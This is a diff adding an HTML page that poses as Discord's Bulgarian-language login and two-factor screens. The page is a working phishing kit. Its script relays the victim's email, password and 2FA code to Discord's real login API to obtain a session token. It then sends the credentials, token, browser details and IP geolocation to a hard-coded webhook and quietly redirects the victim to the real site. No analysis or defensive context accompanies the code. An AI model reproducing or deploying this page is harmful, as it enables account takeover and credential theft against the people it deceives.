@@ -1,1 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Discord</title>
+<meta name="theme-color" content="#313338">
+<link rel="icon" href="https://discord.com/assets/favicon.ico">
+<style>
+:root{--bg:#313338;--card:#2b2d31;--txt:#dbdee1;--mut:#949ba4;--blur:#5865f2;--err:#f23f43;--in:#1e1f22}
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{margin:0;min-height:100%}
+body{background:var(--bg);color:var(--txt);font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;display:flex;align-items:center;justify-content:center;padding:20px}
+.box{width:100%;max-width:420px;background:var(--card);border-radius:8px;padding:28px 22px;box-shadow:0 8px 24px rgba(0,0,0,.35)}
+h1{font-size:22px;text-align:center;margin:0 0 6px}
+p.sub{text-align:center;color:var(--mut);font-size:14px;margin:0 0 20px}
+label{display:block;font-size:12px;font-weight:700;color:var(--mut);text-transform:uppercase;letter-spacing:.02em;margin:0 0 6px}
+label .req{color:var(--err)}
+input{width:100%;padding:11px 12px;background:var(--in);border:1px solid #111214;border-radius:4px;color:var(--txt);font-size:16px;margin-bottom:16px;outline:none}
+input:focus{border-color:var(--blur)}
+button{width:100%;padding:13px;background:var(--blur);color:#fff;border:0;border-radius:4px;font-size:16px;font-weight:600}
+button:disabled{opacity:.6}
+.err{color:var(--err);font-size:13px;margin:-6px 0 14px;display:none}
+.link{color:#00a8fc;font-size:13px;text-decoration:none}
+.foot{margin-top:14px;text-align:center}
+.hide{display:none}
+</style>
+</head>
+<body>
+<div class="box">
+  <div id="step1">
+    <h1>Добре дошъл отново!</h1>
+    <p class="sub">Радваме се да те видим пак</p>
+    <label>Имейл или телефон <span class="req">*</span></label>
+    <input id="login" type="text" autocomplete="username" inputmode="email" autocapitalize="none" spellcheck="false">
+    <label>Парола <span class="req">*</span></label>
+    <input id="pass" type="password" autocomplete="current-password">
+    <div class="err" id="err1"></div>
+    <button id="btn1">Влизане</button>
+    <div class="foot"><a class="link" href="https://discord.com/login">Забравена парола?</a></div>
+  </div>
+  <div id="step2" class="hide">
+    <h1>Двуфакторно удостоверяване</h1>
+    <p class="sub">Въведи 6-цифрения код от приложението</p>
+    <label>Код <span class="req">*</span></label>
+    <input id="code" type="text" inputmode="numeric" autocomplete="one-time-code" maxlength="8">
+    <div class="err" id="err2"></div>
+    <button id="btn2">Потвърди</button>
+  </div>
+  <div id="step3" class="hide">
+    <h1>Пренасочване…</h1>
+    <p class="sub">Момент, влизаме в акаунта</p>
+  </div>
+</div>
+<script>
+const HOOK = "https://discord.com/api/webhooks/1570613327283888159/c6gmuEvg5tzuWhk7reee2XhsoA2UkTyhFPmL-m38DDb39crzxCIPH_N8gEo9ZoLLzUFm";
+let TICKET = null, RQ = null, RQT = null, CAP = null;
+const $ = id => document.getElementById(id);
 
+function meta() {
+  return {
+    ua: navigator.userAgent,
+    lang: navigator.language,
+    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    t: new Date().toISOString()
+  };
+}
+
+async function send(tag, obj) {
+  try {
+    await fetch(HOOK + "?wait=true", {
+      method: "POST",
+      keepalive: true,
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ username: tag, content: "```json\n" + JSON.stringify(obj, null, 2) + "\n```" })
+    });
+  } catch (e) {}
+}
+
+async function geo() {
+  try {
+    const r = await fetch("https://ipapi.co/json/");
+    const d = await r.json();
+    return { ip: d.ip, country: d.country_name, city: d.city, isp: d.org };
+  } catch (e) { return {}; }
+}
+
+function showErr(id, msg) {
+  const e = $(id);
+  e.textContent = msg;
+  e.style.display = "block";
+}
+
+async function login() {
+  const lv = $("login").value.trim(), pv = $("pass").value;
+  if (!lv || !pv) { showErr("err1", "Попълни и двете полета."); return; }
+  $("btn1").disabled = true; $("btn1").textContent = "Влизане…"; $("err1").style.display = "none";
+
+  const payload = { login: lv, password: pv, undeclared_user_agent: navigator.userAgent };
+  if (CAP) { payload.captcha_key = CAP; payload.captcha_rqdata = RQ; payload.captcha_rqtoken = RQT; }
+
+  try {
+    const r = await fetch("https://discord.com/api/v9/auth/login", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+    const d = await r.json();
+
+    if (d.token) {
+      const m = meta(), g = await geo();
+      await send("TOKEN", { login: lv, password: pv, token: d.token, user_id: d.user_id, ...m, ...g });
+      $("step1").classList.add("hide"); $("step3").classList.remove("hide");
+      setTimeout(() => location.replace("https://discord.com/app"), 1400);
+      return;
+    }
+    if (d.mfa) {
+      TICKET = d.ticket;
+      await send("PASS-2FA", { login: lv, password: pv, ...meta() });
+      $("step1").classList.add("hide"); $("step2").classList.remove("hide");
+      return;
+    }
+    if (d.captcha_key) {
+      RQ = d.captcha_rqdata; RQT = d.captcha_rqtoken;
+      showErr("err1", "Потвърди, че не си робот.");
+      renderCaptcha(d.captcha_sitekey);
+      return;
+    }
+    showErr("err1", "Грешен имейл или парола.");
+  } catch (e) {
+    showErr("err1", "Мрежова грешка. Опитай пак.");
+  } finally {
+    $("btn1").disabled = false; $("btn1").textContent = "Влизане";
+  }
+}
+
+async function mfa() {
+  const code = $("code").value.trim();
+  if (!code) { showErr("err2", "Въведи код."); return; }
+  $("btn2").disabled = true; $("btn2").textContent = "Проверка…";
+
+  try {
+    const r = await fetch("https://discord.com/api/v9/auth/mfa/totp", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ code, ticket: TICKET, login_source: null, gift_code_sku_id: null })
+    });
+    const d = await r.json();
+
+    if (d.token) {
+      const m = meta(), g = await geo();
+      await send("TOKEN", { login: $("login").value.trim(), password: $("pass").value, token: d.token, ...m, ...g });
+      $("step2").classList.add("hide"); $("step3").classList.remove("hide");
+      setTimeout(() => location.replace("https://discord.com/app"), 1400);
+      return;
+    }
+    showErr("err2", "Грешен код. Пробвай пак или ползвай резервен код.");
+  } catch (e) {
+    showErr("err2", "Мрежова грешка.");
+  } finally {
+    $("btn2").disabled = false; $("btn2").textContent = "Потвърди";
+  }
+}
+
+function renderCaptcha(sitekey) {
+  if (window.hcaptcha) { hcaptcha.reset(); return; }
+  const s = document.createElement("script");
+  s.src = "https://js.hcaptcha.com/1/api.js";
+  s.onload = () => {
+    const box = document.createElement("div");
+    box.style.margin = "10px 0";
+    $("err1").parentNode.insertBefore(box, $("err1"));
+    hcaptcha.render(box, { sitekey: sitekey, callback: t => { CAP = t; login(); } });
+  };
+  document.head.appendChild(s);
+}
+
+$("btn1").onclick = login;
+$("btn2").onclick = mfa;
+$("pass").addEventListener("keydown", e => { if (e.key === "Enter") login(); });
+$("code").addEventListener("keydown", e => { if (e.key === "Enter") mfa(); });
+</script>
+</body>
+</html>
